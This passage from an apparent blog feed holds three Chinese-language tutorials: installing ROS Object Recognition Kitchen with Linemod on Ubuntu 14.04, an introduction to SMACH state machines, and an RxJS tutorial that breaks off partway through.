安裝 ORK &amp; Linemod雖然 ORK 的開發者已經寫了一份滿不錯的安裝 tutorial，不過我覺得還是值得為他再寫一份自己的整理筆記，可以把過程中遇到的一些問題都整理下來供大家參考。
我目前跑起來的環境是 Ubuntu 14.04+ROS Indigo，首先來裝一些 ORK 需要用到的 package !
export DISTRO=indigosudo apt-get install libopenni-dev ros-$&#123;DISTRO&#125;-catkin ros-$&#123;DISTRO&#125;-ecto* ros-$&#123;DISTRO&#125;-opencv-candidate ros-$&#123;DISTRO&#125;-moveit-msgs

接下來就要安裝 ORK 啦，然後因為我比較喜歡 build from source，所以我會下面會放上一份複雜版的安裝方法，裡面會有比較多跟 error 奮鬥的過程，如果你比較喜歡直接玩應用，安裝什麼的懶得管，那看簡單版的安裝方式其實就可以了。
超簡單版安裝方式超簡單版顧名思義就是超簡單，完全不要管我們會用到哪些 package，只要是 ORK 底下的 package，都裝下去，缺點就是會多浪費一些硬碟空間。只要用一行指令就搞定:
sudo apt-get install ros-indigo-object-recognition-kitchen-*

稍微理解自己裝了什麼的安裝方式sudo apt-get install ros-indigo-object-recognition-core ros-indigo-object-recognition-linemod ros-indigo-object-recognition-msgs ros-indigo-object-recognition-renderer ros-indigo-object-recognition-ros ros-indigo-object-recognition-ros-visualization

Build From Source版安裝方式首先來先裝跟 ROS 銜接的 package，首先要先開啟 terminal，切到 catkin_workspace&#x2F;src 底下
git clone http://github.com/wg-perception/object_recognition_msgsgit clone http://github.com/wg-perception/object_recognition_rosgit clone http://github.com/wg-perception/object_recognition_ros_visualization

然後因為今天的主角是 linemod，所以需要安裝相關 package
git clone http://github.com/wg-perception/object_recognition_coregit clone http://github.com/wg-perception/linemodgit clone http://github.com/wg-perception/ork_renderercd ../ &amp;&amp; catkin_make

在 catkin_make 的過程中可能會碰到因 error 而中斷，會看到類似如下的訊息：

這時候不要怕，繼續給他 catkin_make 下去，你就會發現編譯進度會神奇地有進展：

不過我有碰到一個問題，再怎麼重新編譯都沒有用:
In file included from /home/rosindigo/catkin_ws/src/ork_renderer/src/renderer3d.cpp:50:0:/home/rosindigo/catkin_ws/src/ork_renderer/src/renderer3d_impl_osmesa.h:39:23: fatal error: GL/osmesa.h: 沒有此一檔案或目錄 #include &lt;GL/osmesa.h&gt; ^ compilation terminated. make[2]: *** [ork_renderer/src/CMakeFiles/object_recognition_renderer_3d.dir/renderer3d.cpp.o] Error 1 make[1]: *** [ork_renderer/src/CMakeFiles/object_recognition_renderer_3d.dir/all] Error 2 make: *** [all] Error 2 Invoking &quot;make -j8 -l8&quot; failed

因為是少了 GL&#x2F;osmesa.h，所以需要額外下一個指令 sudo apt-get install libosmesa6-dev 來安裝。
裝到這邊還會有一個問題，就是雖然編譯都已經過了，但 roscd object_recognition_core 時都會出現無法找到此 package 的 error，由於這會對後續要執行演算法時造成問題，所以還是要來處理一下。
我們先重新理一下思路，理論上，編譯過之後就會被加入到 roscd 可以找到的 path 中，但是 roscd 顯然就表示沒有被加進  ROS_PACKAGE_PATH 中，google 了一下發現到有人也遇過類似的問題，解法也確實就是把我們 git clone 下來的那些 package 加入到 ROS_PACKAGE_PATH 中，這樣的話問題就簡單啦!
 先 vim ~/.bashrc 一下，然後在最下面補上一行:
export ROS_PACKAGE_PATH=&quot;$ROS_PACKAGE_PATH:/home/rosindigo/catkin_ws/src&quot;

補完的結果看起來就像:

接上並從 RGB-D Sensor 收資料接下來我們要先處理感測器這塊，畢竟如果沒有感測器，那就根本不用辨識物體的對吧。原本官方教學上是建議用 roslaunch openni2_launch openni2.launch，但因為我是用 Kinect 1，要用 roslaunch openni_launch openni.launch。
跑起來之後應該就可以在 Rviz 看到以下的畫面:

安裝物體辨識資料庫 &amp; 加入 modelORK 是一套以 template matching 方法為主的辨識工具，也就是說，他會把感測器看到的物體跟資料庫中的物體比對，夠相似的就算是辨識成功，所以我們接著要來處理資料庫這一塊。首先要安裝 CouchDB 這個工具 (用 sudo apt-get install couchdb )。
接下來檢查一下是否有安裝成功 (用 curl -X GET http://localhost:5984 )。如果成功，應該會看到類似下面的畫面：

rosrun object_recognition_core object_add.py -n &quot;coke &quot; -d &quot;A universal can of coke&quot; --commit

執行上面這個指令之後，你可以去 http://localhost:5984/_utils/database.html?object_recognition/_design/objects/_view/by_object_name 看看自己的資料庫裡是否已經新增了這個物體：

接下來就是要指定這個物體的 3D 模型是什麼，這邊就需要先下載個 package 並編譯。
git clone https://github.com/wg-perception/ork_tutorialscd .. &amp;&amp; catkin_make

ork_tutorials裡面有一個 coke.stl 檔，他就是一個可樂罐的 3D 模型，足夠讓我們先用來辨識。注意下面這個指令中有一串看起來像亂碼的東西，但那其實是物體的 id ，這就要從你自己的資料庫裡去看了。
rosrun object_recognition_core mesh_add.py 0be612246c9b0a00baaa4adefb0009eb /home/rosindigo/catkin_ws/src/ork_tutorials/data/coke.stl --commit

執行 Linemod 演算法 (Training &amp; Detection)好了!終於要進入正題了，這一塊一樣有 官方tutorial 可以參考，我們先從 Training 開始。
rosrun object_recognition_core training -c `rospack find object_recognition_linemod`/conf/training.ork

這個 training 指令會利用資料庫裡的 3D 模型建立辨識時所需要的 template，如果執行成功，你會看到如下的訊息：

如果已經訓練完畢，下一步就是用他來辨識物體啦。
可惜筆者的 Kinect 突然壞掉了，沒有辦法直接 demo 出來，不過這邊的指令也不會很複雜。
roslaunch openni_launch openni.launchrosrun dynamic_reconfigure dynparam set /camera/driver depth_registration Truerosrun dynamic_reconfigure dynparam set /camera/driver image_mode 2 rosrun dynamic_reconfigure dynparam set /camera/driver depth_mode 2rosrun topic_tools relay /camera/depth_registered/image_raw /camera/depth_registered/imagerosrun object_recognition_core detection -c  `rospack find object_recognition_linemod`/conf/detection.ros.ork

接下來就可以用 Rviz 來看辨識結果啦！

演算法簡介既然 Linemod 是一個這麼強大的演算法，試著去稍微了解一下演算法也是很合理的，原始的論文在這邊 (2011 ICCV 的 oral 論文)，以下的圖片也是出自這篇論文。
首先來看一下這篇論文的辨識結果：

這個演算法的核心概念就是整合多種不同的 modalities，把 modality 想成物體的不同特徵可能比較好懂，例如下圖中就有兩種 modalities – gradient 跟 surface normal，而因為這兩種特徵所表達的特性不一樣，所以可以互補，進而達到更好的辨識效果。

所以說，Linemod 需要先有已知的物體模型，然後先取得這個物體各種 modlaities 的template，這樣在辨識的時候就可以拿 template 來比對。
不過這概念在電腦視覺領域中並不特別，因為同時使用不同特徵來加強物體辨識的效果是很直覺的，也有很多不同的方法可以做到這件事情，所以這篇論文還提出了一個方法來增進 similarity measurement 的效率 ( similarity measurement 的意思是 measure 儲存的 template 跟現在看到的影像資料有多接近)。
總結這篇文章很簡略地介紹了 ORK 的安裝、基本的使用方式(使用 Linemod )、還有演算法簡介，有興趣的讀者可以自己動手玩玩看 (如果沒有實體的 RGB-D sensor，你也可以試著用 Gazebo 裡面的 Kinect 來模擬)!
延伸閱讀
使用 ORK 的 tabletop 演算法
建立自己的 ORK 模型
ORK 開發者介紹演講
Linemod的OpenCV實作

關於作者：@pojenlai 演算法工程師，對機器人跟電腦視覺有少許研究，最近在鍛鍊自己的執行力
]]></content>
      <tags>
        <tag>機器人, 物體辨識, ROS, Object Recognition Kitchen, Linemod</tag>
      </tags>
  </entry>
  <entry>
    <title>ROS SMACH 簡介</title>
    <url>/2017/02/18/ros-smach-intro/</url>
    <content><![CDATA[前言這次想跟大家介紹一個好用的工具 - SMACH (唸法同 smash)。SMACH 的存在意義是為了讓大家可以用系統化的方式來撰寫機器人的行為。這個系統化的方式是 Finite State Machine，概念上跟之前介紹過的 ecto 的 graph 概念有點相似。
簡單來說，就是讓我們可以很方便地定義機器人的各種狀態，所以機器人就不再只是根據程式碼裡面寫定的一連串行為去行動，而可以根據各種不同的條件進行狀態的切換。舉例來說，一個掃地機器人平時處於掃地狀態時，他要做的事情就是移動跟吸塵，而當機器人看到障礙物的時候，就可以切換到避開障礙物的狀態，等到障礙物消失的時候，再切換到掃地狀態。
想要對 SMACH 有更具體的概念嗎? 可以看看這個影片:

雖然 SMACH 跟 ROS 可以一併使用，他的核心其實是一個跟 ROS 沒有關係的 Python library，是透過 smach_ros 來跟 ROS 的 topics, services 跟 actions 串接。
使用 SMACH 的幾大好處我們雖然知道 Finite State Machine 可以建立由狀態來決定行為的程式，但除了這個之外還有幾個特點，讓我們可以在適當的時候使用 SMACH。

Task Hierarchy: state 可以由更多小 state 組成，建立複雜的行為
Task Priority: state 之間可以有優先權，有高優先權的 state 可以中斷低優先權的 state 
Concurrency: 如果想要同時執行多項行為，也可以用 SMACH 來實現

SMACH 基本小程式這邊我們用個簡單的範例來介紹要怎麼創造一個 state machine，首先呢，最重要的東西就是 state，在 SMACH 的語法規定中，每個 state 用一個 class 來寫，其中要包含 init 和 execute 兩個函式，實際執行的行為會被寫在 execute 函式裡面。
當每個 state 的行為都被定義好之後，剩下要寫的就只需要在 main 中，將各個 state 加入 SMACH 的 container (其實 state machine 就只是一個包含很多 state 的 container 而已) 就好。
在下面的範例中，只有兩個簡單的 state - FOO 和 BAR，他們的關係如下圖:

#!/usr/bin/env pythonimport roslib; roslib.load_manifest(&#x27;smach_tutorials&#x27;)import rospyimport smachimport smach_ros# define state Fooclass Foo(smach.State):    def __init__(self):        smach.State.__init__(self, outcomes=[&#x27;outcome1&#x27;,&#x27;outcome2&#x27;])        self.counter = 0    def execute(self, userdata):        rospy.loginfo(&#x27;Executing state FOO&#x27;)        if self.counter &lt; 3:            self.counter += 1            return &#x27;outcome1&#x27;        else:            return &#x27;outcome2&#x27;# define state Barclass Bar(smach.State):    def __init__(self):        smach.State.__init__(self, outcomes=[&#x27;outcome1&#x27;])    def execute(self, userdata):        rospy.loginfo(&#x27;Executing state BAR&#x27;)        return &#x27;outcome1&#x27;        def main():    rospy.init_node(&#x27;smach_example_state_machine&#x27;)    # Create a SMACH state machine    sm = smach.StateMachine(outcomes=[&#x27;outcome4&#x27;])    # Open the container    with sm:        # Add states to the container        smach.StateMachine.add(&#x27;FOO&#x27;, Foo(),                                transitions=&#123;&#x27;outcome1&#x27;:&#x27;BAR&#x27;, &#x27;outcome2&#x27;:&#x27;outcome4&#x27;&#125;)        smach.StateMachine.add(&#x27;BAR&#x27;, Bar(),                                transitions=&#123;&#x27;outcome1&#x27;:&#x27;FOO&#x27;&#125;)    # Execute SMACH plan    outcome = sm.execute()if __name__ == &#x27;__main__&#x27;:    main()

總結今天跟大家簡介了 SMACH 這個 package，也介紹了要怎麼寫一個非常小的 state machine，SMACH 可以做到相當複雜的行為，如果有興趣的話，可以去看看延伸閱讀中提供的教學，裡面有相當完整詳細的說明。
其實要撰寫比較複雜的機器人行為，除了 finite state machine 之外，behavior tree 跟 teer 都是常見的選擇，根據應用的不同可以選擇自己想要的方法。連結可以在延伸閱讀的地方找到喔！
延伸閱讀
SMACH Tutorials
ROS behavior tree package
ROS teer package

]]></content>
      <tags>
        <tag>機器人, Robot, ROS, SMACH, Finite State Machine</tag>
      </tags>
  </entry>
  <entry>
    <title>希望是最淺顯易懂的 RxJS 教學</title>
    <url>/2017/12/08/rxjs/</url>
    <content><![CDATA[前言關注 RxJS 已經好一段時間了，最早知道這個東西是因為 redux-observable，是一個 redux 的 middleware，Netflix 利用它來解決複雜的非同步相關問題，那時候我連redux-saga都還沒搞懂，沒想到就又有新的東西出來了。
半年前花了一些時間，找了很多網路上的資料，試圖想要搞懂這整個東西。可是對我來說，很多教學的步調都太快了，不然就是講得太仔細，反而讓初學者無所適從。
這次有機會在公司的新專案裡面嘗試導入redux-observable，身為提倡要導入的人，勢必要對這東西有一定的瞭解。秉持著這個想法，上週認真花了點時間再次把相關資源都研究了一下，漸漸整理出一套「我覺得應該可以把 RxJS 講得更好懂」的方法，在這邊跟大家分享一下。
在開始之前，要先大力稱讚去年 iT 邦幫忙鐵人賽的 Web 組冠軍：30 天精通 RxJS，這系列文章寫得很完整，感受得出來作者下了很多功夫在這上面。看完這篇之後如果對更多應用有興趣的，可以去把這系列的文章讀完。
好，那就讓我們開始吧！
請你先忘掉 RxJS沒錯，你沒看錯。
要學會 RxJS 的第一件事情就是：忘記它。
忘記有這個東西，完全忘記，先讓我講幾個其他東西，等我們需要講到 RxJS 的時候我會再提醒你的。
在我們談到主角之前，先來做一些有趣的事情吧！
程式基礎能力測試先讓我們做一個簡單的練習題暖身，題目是這樣的：

有一個陣列，裡面有三種類型的資料：數字、a~z組成的字串、數字組成的字串，請你把每個數字以及數字組成的字串乘以二之後加總範例輸入：[1, 5, 9, 3, ‘hi’, ‘tb’, 456, ‘11’, ‘yoyoyo’]

你看完之後應該會說：「這有什麼難的？」，並且在一分鐘以內就寫出下面的程式碼：
const source = [1, 5, 9, 3, &#x27;hi&#x27;, &#x27;tb&#x27;, 456, &#x27;11&#x27;, &#x27;yoyoyo&#x27;];let total = 0;  for (let i = 0; i &lt; source.length; i++) &#123;  let num = parseInt(source[i], 10);  if (!isNaN(num)) &#123;    total += num * 2;  &#125;&#125;

相信大家一定都是很直覺的就寫出上面的程式碼，但如果你是個 functional programming 的愛好者，你可能會改用另外一種思路來解決問題：
const source = [1, 5, 9, 3, &#x27;hi&#x27;, &#x27;tb&#x27;, 456, &#x27;11&#x27;, &#x27;yoyoyo&#x27;];  let total = source  .map(x =&gt; parseInt(x, 10))  .filter(x =&gt; !isNaN(x))  .map(x =&gt; x * 2)  .reduce((total, value) =&gt; total + value )

一開始的例子叫做Imperative（命令式），用陣列搭配一堆函式的例子叫做Declarative（聲明式）。如果你去查了一下定義，應該會看到這兩個的解釋：

Imperative 是命令機器去做事情（how），這樣不管你想要的是什麼（what），都會按照你的命令實現；Declarative 是告訴機器你想要的是什麼（what），讓機器想出如何去做（how）

好，你有看懂上面這些在說什麼嗎？
我是沒有啦。
所以讓我們再看一個例子，其實 Declarative 你已經常常在用了，只是你不知道而已，那就是 SQL：
SELECT * from dogs INNER JOIN owners WHERE dogs.owner_id = owners.id

這句話就是：我要所有狗的資料加上主人的資料。
我只有說「我要」而已，那要怎麼拿到這些資料？我不知道，我也不用知道，都讓 SQL 底層決定怎麼去操作就好。
如果我要自己做出這些資料，在 JavaScript 裡面我必須這樣寫（程式碼取自声明式编程和命令式编程的比较）：
//dogs = [&#123;name: &#x27;Fido&#x27;, owner_id: 1&#125;, &#123;...&#125;, ... ]//owners = [&#123;id: 1, name: &#x27;Bob&#x27;&#125;, &#123;...&#125;, ...]  var dogsWithOwners = []var dog, owner  for(var di=0; di &lt; dogs.length; di++) &#123;  dog = dogs[di]  for(var oi=0; oi &lt; owners.length; oi++) &#123;    owner = owners[oi]    if (owner &amp;&amp; dog.owner_id == owner.id) &#123;      dogsWithOwners.push(&#123;        dog: dog,        owner: owner      &#125;)    &#125;  &#125;&#125;

應該可以大致體驗出兩者的差別吧？後者你必須自己一步步去決定該怎麼做，而前者只是僅僅跟你說：「我想要怎樣的資料」而已。
接著我們再把目光放回到把數字乘以二相加的那個練習。對我來說，最大的不同點是後面那個用陣列搭配函式的例子，他的核心概念是：

把原始資料經過一連串的轉換，變成你想要的資訊

這點超級重要，因為在一開始的例子中，我們是自己一步步去 parse，去檢查去相加，得出數字的總和。而後面的那個例子，他是把原始的資料（陣列），經過一系列的轉換（map, filter, reduce），最後變成了我們想要的答案。
畫成圖的話，應該會長這樣（請原諒我偷懶把乘二的部分拿掉了，但意思不影響）：

把原始資料經過一連串的轉換，最後變成你想要的答案，這點就是後者最大的不同。只要你有了這個基礎知識之後，再來看 RxJS 就不會覺得太奇怪了。
Reactive Programming談到 RxJS 的時候，都會談到 Reactive 這個詞，那什麼是 Reactive 呢？可以從英文上的字義來看，這個單字的意思是：「反應、反應性的」，意思就是你要對一些事情做出反應。
所以 Reactive 其實就是在講說：「某些事情發生時，我能夠做出反應」。
讓我們來舉一個大家非常熟知的例子：  
window.addEventListener(&#x27;click&#x27;, function()&#123;  console.log(&#x27;click!&#x27;);&#125;)

我們加了一個 event listener 在 window 上面，所以我們可以監聽到這個事件，每當使用者點擊的時候就列印出 log。換句話說，這樣就是：「當 window 被點擊時，我可以做出反應」。
正式進入 RxJS如果你去看 ReactiveX 的網頁，你會發現他有明確的定義 ReactiveX：

ReactiveX is a combination of the best ideas fromthe Observer pattern, the Iterator pattern, and functional programming

第一個 Observer pattern 就像是 event listener 那樣，在某些事情發生時，我們可以對其作出反應；第二個 Iterator pattern 我們跳過不講，我認為暫時不影響理解；第三個就像是一開始的例子，我們可以把一個陣列經過多次轉換，轉換成我們想要的資料。
在 Reactive Programming 裡面，最重要的兩個東西叫做 Observable 跟 Observer，其實一開始讓我最困惑的點是因為我英文不好，不知道這兩個到底誰是觀察的誰是被觀察的。
先把它們翻成中文，Observable 就是「可被觀察的」，Observer 就是所謂的「觀察者」。
這是什麼意思呢？就如同上面的例子一樣，當（可被觀察的東西）有事情發生，（Observer，觀察者）就可以做出反應。
直接舉一個例子你就知道了：
Rx.Observable.fromEvent(window, &#x27;click&#x27;)  .subscribe(e =&gt; &#123;    console.log(&#x27;click~&#x27;);  &#125;)

上面這段程式碼跟我幫 window 加上 event listener 在做的事情完全一樣，只是這邊我們使用了 RxJS 提供的方法叫做fromEvent，來把一個 event 轉成 Observable（可被觀察的），並且在最後加上 subscribe。
這樣寫就代表說我訂閱了這個 Observable，只要有任何事情發生，就會執行我傳進去的 function。
所以到底什麼是 Observable？
Observable 就是一個可被觀察的對象，這個對象可以是任何東西（例如說上述例子就是 window 的 click 事件），當有新資料的時候（例如說新的點擊事件），你就可以接收到這個新資料的資訊並且做出反應。
比起 Observable 這個冷冰冰的說法，我更喜歡的一個說法是 stream，資料流。其實每一個 Observable 就是一個資料流，但什麼是資料流？你就想像成是會一直增加元素的陣列就好了，有新的事件發生就 push 進去。如果你喜歡更專業一點的說法，可以叫它：「時間序列上的一連串資料事件」（取自 Reactive Programming 簡介與教學(以 RxJS 為例)）
或是我再舉一個例子，stream 的另外一個解釋就是所謂的「串流影片」，意思就是隨著你不斷播放，就會不斷下載新的片段進來。此時你腦中應該要有個畫面，就是像水流那樣，不斷有新的東西流進來，這個東西就叫做 stream。
（圖片取自 giphy）
我理解資料流了，然後呢？上面有說過，我們可以把任何一個東西轉成 Observable，讓它變成資料流，可是這不就跟 addEventListener 一樣嗎？有什麼特別的？
有，還真的比較特別。
希望你沒有忘記我們剛開始做的那個小練習，就是把一個陣列透過一系列轉換，變成我們要的資料的那個練習。我剛剛有說，你可以把 Observable 想成是「會一直增加元素的陣列」，這代表什麼呢？
代表我們也可以把 Observable 做一系列的轉換！我們也可以用那些用在陣列上的 function！
Rx.Observable.fromEvent(window, &#x27;click&#x27;)  .map(e =&gt; e.target)  .subscribe(value =&gt; &#123;    console.log(&#x27;click: &#x27;, value)  &#125;)


我們把 click 事件經過 map 轉換為點擊到的 element，所以當我們最後在 subscribe 的時候，收到的 value 就會是我們點擊的東西。
接著來看一個稍微進階一點的例子：
Rx.Observable.fromEvent(window, &#x27;click&#x27;)  .map(e =&gt; 1)  .scan((total, now) =&gt; total + now)  .subscribe(value =&gt; &#123;    document.querySelector(&#x27;#counter&#x27;).innerText = value;  &#125;)


首先我們先把每一個 click 事件都透過map轉換成 1（或者你也可以寫成.mapTo(1)），所以每按一次就送出一個數字 1。scan的話其實就是我們一開始對陣列用的reduce，你可以想成是換個名字而已。透過scan加總以後傳給 subscriber，顯示在頁面上面。
就這樣簡單幾行，就完成了一個計算點擊次數的 counter。
可以用一個簡單的 gif 圖來表示上面的範例：

可是 Observable 不只這樣而已，接下來我們要進入到它最厲害的地方了。
威力無窮的組合技如果把兩個陣列合併，會變成什麼？例如說[1, 2, 3]跟[4, 5, 6]？
這要看你指的「合併」是什麼，如果是指串接，那就是[1, 2, 3, 4, 5, 6]，如果是指相加，那就是[5, 7, 9]。
那如果把兩個 Observable 合併會變成什麼？
Observable 跟陣列的差別就在於多了一個維度：時間。
Observable 是「時間序列上的一連串資料事件」，就像我前面講的一樣，可以看成是一個一直會有新資料進來的陣列。
我們先來看看一張很棒的圖，很清楚地解釋了兩個 Observable 合併會變成什麼：
（取自：http://rxmarbles.com/#merge）
上面是一個 Observable，每一個圓點代表一個資料，下面也是一樣，把這兩個合併之後就變成最下面那一條，看圖解應該還滿好懂的，就像是把兩個時間軸合併一樣。
讓我們來看一個可以展現合併強大之處的範例，我們有 +1 跟 -1 兩個按鈕以及文字顯示現在的數字是多少：

該怎麼達成這個功能呢？基本的想法就是我們先把每個 +1 的 click 事件都通過mapTo變成數字 1，取叫 Observable_plus1 好了。再做出一個 Observable_minus1 是把每個 -1 的 click 事件都通過mapTo變成數字 -1。
把這兩個 Observable 合併之後，再利用剛剛提到的scan加總，就是目前應該要顯示的數字了！
Rx.Observable.fromEvent(document.querySelector(&#x27;input[name=plus]&#x27;), &#x27;click&#x27;)  .mapTo(1)  .merge(    Rx.Observable.fromEvent(document.querySelector(&#x27;input[name=minus]&#x27;), &#x27;click&#x27;)      .mapTo(-1)  )  .scan((total, now) =&gt; total + now)  .subscribe(value =&gt; &#123;    document.querySelector(&#x27;#counter&#x27;).innerText = value;  &#125;)

如果你還是不懂的話，可以參考下面的精美範例，示範這兩個 Observable 是怎麼合在一起的（O代表點擊事件，+1跟-1則是mapTo之後的結果）：

讓我們來比較一下如果不用 Observable 的話，程式碼會長怎樣：
var total = 0;document.querySelector(&#x27;input[name=plus]&#x27;).addEventListener(&#x27;click&#x27;, () =&gt; &#123;  total++;  document.querySelector(&#x27;#counter&#x27;).innerText = total;&#125;)  document.querySelector(&#x27;input[name=minus]&#x27;).addEventListener(&#x27;click&#x27;, () =&gt; &#123;  total--;  document.querySelector(&#x27;#counter&#x27;).innerText = total;&#125;)

有沒有發覺兩者真的差別很大？就如同我之前所說的，是兩種完全不同的思考模式，所以 Reactive Programming 困難的地方不是在於理解，也不是在於語法（這兩者相信你目前都有些概念了），而是在於換一種全新的思考模式。
以上面的寫法來說，就是告訴電腦：「按下加的時候就把一個變數 +1，然後更改文字；按下減的時候就 -1 並且也更改文字」，就可以達成計數器的功能。
以 Reactive 的寫法，就是把按下加當成一個資料流，把按下減也當成一個資料流，再透過各種 function 把這兩個流轉換並且合併起來，讓最後的那個流就是我們想要的結果（計數器）。
你現在應該能體會到我一開始說的了：「把原始資料經過一連串的轉換，最後變成你想要的答案」，這點就是 Reactive Programming 最大的特色。
組合技中的組合技我們來看一個更複雜一點的範例，是在 canvas 上面實現非常簡單的繪圖功能，就是滑鼠按下去之後可以畫畫，放開來就停止。

要實現這個功能很間單，canvas 提供lineTo(x, y)這個方法，只要在滑鼠移動時不斷呼叫這個方法，就可以不斷畫出圖形來。但有一點要注意的是當你在按下滑鼠時，應該先呼叫moveTo(x, y)把繪圖的點移到指定位置，為什麼呢？
假設我們第一次畫圖是在左上角，第二次按下滑鼠的位置是在右下角，如果沒有先用moveTo移動而是直接用lineTo的話，就會多一條線從左上角延伸到右下角。moveTo跟lineTo的差別就是前者只是移動，後者會跟上次的點連接在一起畫成一條線。

var canvas = document.getElementById(&#x27;canvas&#x27;);var ctx = canvas.getContext(&#x27;2d&#x27;);ctx.beginPath(); // 開始畫畫  function draw(e)&#123;  ctx.lineTo(e.clientX,e.clientY); // 移到滑鼠在的位置  ctx.stroke(); // 畫畫&#125;  // 按下去滑鼠才開始偵測 mousemove 事件canvas.addEventListener(&#x27;mousedown&#x27;, function(e)&#123;  ctx.moveTo(e.clientX, e.clientY); // 每次按下的時候必須要先把繪圖的點移到那邊，否則會受上次畫的位置影響  canvas.addEventListener(&#x27;mousemove&#x27;, draw);&#125;)  // 放開滑鼠就停止偵測 canvas.addEventListener(&#x27;mouseup&#x27;, function(e)&#123;  canvas.removeEventListener(&#x27;mousemove&#x27;, draw);&#125;)

那如果在 RxJS 裡面，該怎麼實作這個功能呢？
首先憑直覺，應該就是先加上mousedown的事件對吧！至少有個開頭。
Rx.Observable.fromEvent(canvas, &#x27;mousedown&#x27;)  .subscribe(e =&gt; &#123;    console.log(&#x27;mousedown&#x27;);  &#125;)

可是滑鼠按下去之後應該要變成什麼？這個時候應該要開始監聽mousemove對吧，所以我們這樣寫，用mapTo把每一個mousedown的事件都轉換成mousemove的 Observable：
Rx.Observable.fromEvent(canvas, &#x27;mousedown&#x27;)  .mapTo(    Rx.Observable.fromEvent(canvas, &#x27;mousemove&#x27;)  )  .subscribe(value =&gt; &#123;    console.log(&#x27;value: &#x27;, value);  &#125;)

接著你看一下 console，你會發現每當我點擊的時候，console 就會印出FromEventObservable &#123;_isScalar: false, sourceObj: canvas#canvas, eventName: &quot;mousemove&quot;, selector: undefined, options: undefined&#125;
仔細想一下你會發現也滿合理的，因為我用mapTo把每一個滑鼠按下去的事件轉成一個 mousemove 的 Observable，所以用 subscribe 訂閱之後拿到的東西就會是這個 Observable。如果畫成圖，大概長得像這樣：

好了，那怎麼辦呢？我想要的其實不是 Observable 本身，而是屬於這個 Observable 裡面的那些東西啊！現在這個情形就是 Observable 裡面又有 Observable，有兩層，可是我想要讓它變成一層就好，該怎麼辦呢？
在此提供一個讓 Observable 變簡單的訣竅：

只要有問題，先想想 Array 就對了！

我前面有提過，可以把 Observable 看成是加上時間維度的進階版陣列，因此只要是陣列有的方法，Observable 通常也都會有。
舉例來說，一個陣列可能長這樣：[1, [2, 2.5], 3, [4, 5]]一共有兩層，第二層也是一個陣列。
如果想讓它變一層的話怎麼辦呢？壓平！
有用過 lodash 或是其他類似的 library 的話，你應該有聽過_.flatten這個方法，可以把這種陣列壓平，變成：[1, 2, 2.5, 3, 4, 5]。
用 flat 這個關鍵字去搜尋 Rx 文件的話，你會找到一個方法叫做 FlatMap，簡單來說就是先map之後再自動幫你壓平。
所以，我們可以把程式碼改成這樣：
Rx.Observable.fromEvent(canvas, &#x27;mousedown&#x27;)  .flatMap(e =&gt; Rx.Observable.fromEvent(canvas, &#x27;mousemove&#x27;))              .subscribe(e =&gt; &#123;    console.log(e);  &#125;)

當你點擊之後，會發現隨著滑鼠移動，console 會印出一大堆 log，就代表我們成功了。
畫成示意圖的話會變成這樣（為了方便說明，我把flatMap在圖片上變成map跟flatten兩個步驟）：

接下來呢？接下來我們要讓它可以在滑鼠鬆開的時候停止，該怎麼做呢？RxJS 有一個方法叫做takeUntil，意思就是拿到…發生為止，傳進去的參數必須是一個 Observable。
舉例來說，如果寫.takeUntil(window, &#39;click&#39;)，就表示如果任何window的點擊事件發生，這個 Observable 就會立刻終止，不會再送出任何資料。
應用在繪畫的例子上，我們只要把takeUntil後面傳的參數換成滑鼠鬆開就好！順便把subscribe跟畫畫的 function 也一起完成吧！
Rx.Observable.fromEvent(canvas, &#x27;mousedown&#x27;)  .flatMap(e =&gt; Rx.Observable.fromEvent(canvas, &#x27;mousemove&#x27;))  .takeUntil(Rx.Observable.fromEvent(canvas, &#x27;mouseup&#x27;))           .subscribe(e =&gt; &#123;    draw(e);  &#125;)

改完之後馬上來實驗一下！滑鼠按下去之後順利開始畫圖，鬆開以後畫圖停止，完美！
咦，可是怎麼按下第二次就沒反應了？我們做出了一個「只能夠成功畫一次圖」的 Observable。
為什麼呢？我們可以先來看一下takeUntil的示意圖（取自：http://rxmarbles.com/#takeUntil）

以我們的情形來說，就是只要mouseup事件發生，「整個 Observable」就會停止，所以只有第一次能夠畫圖成功。但我們想要的其實不是這樣，我們想要的是只有mousemove停止而已，而不是整個都停止。
所以，我們應該把takeUntil放在mousemove的後面，也就是：
Rx.Observable.fromEvent(canvas, &#x27;mousedown&#x27;)  .flatMap(e =&gt; Rx.Observable.fromEvent(canvas, &#x27;mousemove&#x27;)      .takeUntil(Rx.Observable.fromEvent(canvas, &#x27;mouseup&#x27;))    )  .subscribe(e =&gt; &#123;    draw(e);  &#125;)

這樣子裡面的那個mousemove的 Observable 就會在滑鼠鬆開時停止發送事件，而我們最外層的這個 Observable 監聽的是滑鼠按下，會一直監聽下去。
到這邊其實就差不多了，但還有一個小 bug 要修，就是我們沒有在mousedown的時候利用moveTo移動，造成我們一開始說的那個會把上次畫的跟這次畫的連在一起的問題。
那怎麼辦呢？我已經把mousedown事件轉成其他資料流了，我要怎麼在mousedown的時候做事？
有一個方法叫做do，就是為了這種情形而設立的，使用時機是：「你想做一點事，卻又不想影響資料流」，有點像是能夠針對不同階段 subscribe 的感覺，mousedown的時候 subscribe 一次，最後要畫圖的時候又 subscribe 一次。
Rx.Observable.fromEvent(canvas, &#x27;mousedown&#x27;)  .do(e =&gt; &#123;    ctx.moveTo(e.clientX, e.clientY)  &#125;)  .flatMap(e =&gt; Rx.Observable.fromEvent(canvas, &#x27;mousemove&#x27;)      .takeUntil(Rx.Observable.fromEvent(canvas, &#x27;mouseup&#x27;))    )  .subscribe(e =&gt; &#123;    draw(e);  &#125;)

到這邊，我們就順利完成了畫圖的功能。
如果你想試試看你有沒有搞懂，可以實作看看拖拉移動物體的功能，原理跟這個很類似，都是偵測滑鼠的事件並且做出反應。
喝口水休息一下，下半場要開始了上半場的目標在於讓你理解什麼是 Rx，並且掌握幾個基本概念：

一個資料流可以經過一系列轉換，變成另一個資料流
這些轉換基本上都跟陣列有的差不多，像是map、filter、flatten等等
你可以合併多個 Observable，也可以把二維的 Observable 壓平

下半場專注的點則是在於實戰應用，並且圍繞著 RxJS 最適合的場景之一：API。
前面我們有提到說可以把 DOM 物件的 event 變成資料流，但除了這個以外，Promise 其實也可以變成資料流。概念其實也很簡單啦，就是 Promise 被 resovle 的時候就發送一個資料，被 reject 的時候就終止。
讓我們來看一個簡單的小範例，每按一次按鈕就會發送一個 request
